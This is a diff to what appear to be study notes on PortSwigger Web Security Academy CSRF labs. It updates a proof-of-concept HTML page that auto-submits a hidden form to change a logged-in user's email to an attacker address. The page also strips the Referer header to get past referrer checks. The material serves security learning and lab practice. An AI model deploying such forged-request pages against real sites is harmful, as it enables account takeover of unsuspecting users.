@@ -2154,13 +2154,14 @@ email=wiener@normal-user.com
       - **Remove Referer > success**
     -  Remove the referrer by including `<meta name="referrer" content="no-referrer">` under the head
        ```
-          <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-            <input type="hidden" name="email" value="attacker&#64;normal&#45;user&#46;net" />
-            <input type="submit" value="Submit request" />
-          </form>
-          <script>
-            document.forms[0].submit();
-          </script>
+       <head><meta name="referrer" content="no-referrer"></head>
+       <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+           <input type="hidden" name="email" value="attacker&#64;normal&#45;user&#46;net" />
+           <input type="submit" value="Submit request" />
+       </form>
+       <script>
+           document.forms[0].submit();
+       </script>
        ```
 12. CSRF with **broken Referer validation**
     - Application checks the Referer contains its own **domain name**
